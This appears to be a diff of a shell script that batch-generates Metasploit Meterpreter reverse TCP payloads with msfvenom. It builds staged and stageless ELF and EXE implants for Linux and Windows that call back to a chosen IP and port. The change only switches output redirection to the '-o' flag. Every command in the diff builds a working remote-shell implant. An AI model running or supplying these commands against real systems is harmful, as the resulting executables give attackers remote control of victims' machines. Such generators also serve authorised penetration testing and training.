@@ -20,16 +20,16 @@ echo "[*] IPADDR = $IPADDR"
 echo "[*] Generating payloads..."
 # TODO: check the CLI args for platform type
 # linux stageless reverse TCP
-msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=$IPADDR LPORT=$LPORT -f elf > $OUTPUT_DIR/linux_86_ns_meterpeter_reverse_tcp.elf
-msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=$IPADDR LPORT=$LPORT -f elf > $OUTPUT_DIR/linux_64_ns_meterpeter_reverse_tcp.elf
+msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=$IPADDR LPORT=$LPORT -f elf -o $OUTPUT_DIR/linux_86_ns_meterpeter_reverse_tcp.elf
+msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=$IPADDR LPORT=$LPORT -f elf -o $OUTPUT_DIR/linux_64_ns_meterpeter_reverse_tcp.elf
 # linux staged reverse TCP
-msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$IPADDR LPORT=$LPORT -f elf > $OUTPUT_DIR/linux_86_meterpeter_reverse_tcp.elf
-msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$IPADDR LPORT=$LPORT -f elf > $OUTPUT_DIR/linux_64_meterpeter_reverse_tcp.elf
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$IPADDR LPORT=$LPORT -f elf -o $OUTPUT_DIR/linux_86_meterpeter_reverse_tcp.elf
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$IPADDR LPORT=$LPORT -f elf -o $OUTPUT_DIR/linux_64_meterpeter_reverse_tcp.elf
 # windows stageless reverse TCP
-msfvenom -p windows/meterpreter_reverse_tcp LHOST=$IPADDR LPORT=$LPORT -f exe > $OUTPUT_DIR/windows_86_ns_meterpeter_reverse_tcp.exe
-msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$IPADDR LPORT=$LPORT -f exe > $OUTPUT_DIR/windows_64_ns_meterpeter_reverse_tcp.exe
+msfvenom -p windows/meterpreter_reverse_tcp LHOST=$IPADDR LPORT=$LPORT -f exe -o $OUTPUT_DIR/windows_86_ns_meterpeter_reverse_tcp.exe
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$IPADDR LPORT=$LPORT -f exe -o $OUTPUT_DIR/windows_64_ns_meterpeter_reverse_tcp.exe
 # windows staged reverse TCP
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IPADDR LPORT=$LPORT -f exe > $OUTPUT_DIR/windows_86_meterpeter_reverse_tcp.exe
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$IPADDR LPORT=$LPORT -f exe > $OUTPUT_DIR/windows_64_meterpeter_reverse_tcp.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IPADDR LPORT=$LPORT -f exe -o $OUTPUT_DIR/windows_86_meterpeter_reverse_tcp.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$IPADDR LPORT=$LPORT -f exe -o $OUTPUT_DIR/windows_64_meterpeter_reverse_tcp.exe
 
 echo "[*] Done."
